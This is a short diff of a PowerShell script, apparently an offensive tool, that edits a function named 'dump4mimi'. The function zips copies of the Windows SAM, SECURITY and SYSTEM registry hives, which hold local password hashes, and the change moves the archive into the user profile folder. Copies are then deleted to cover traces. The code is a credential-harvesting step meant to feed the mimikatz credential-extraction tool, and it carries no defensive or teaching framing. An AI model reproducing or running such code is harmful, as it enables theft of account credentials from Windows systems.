@@ -93,7 +93,7 @@ function dump4mimi {
     Clear-Host
     Start-Sleep -Seconds 3.5
     Set-Location C:\
-    Compress-Archive "C:\sam","C:\security","C:\system" -DestinationPath "C:\d4m.zip"
+    Compress-Archive "C:\sam","C:\security","C:\system" -DestinationPath "$env:userprofile\d4m.zip"
     Start-Sleep -Seconds 0.5
     Clear-Host
 	Remove-Item -Path "C:\sam" -force -ErrorAction SilentlyContinue
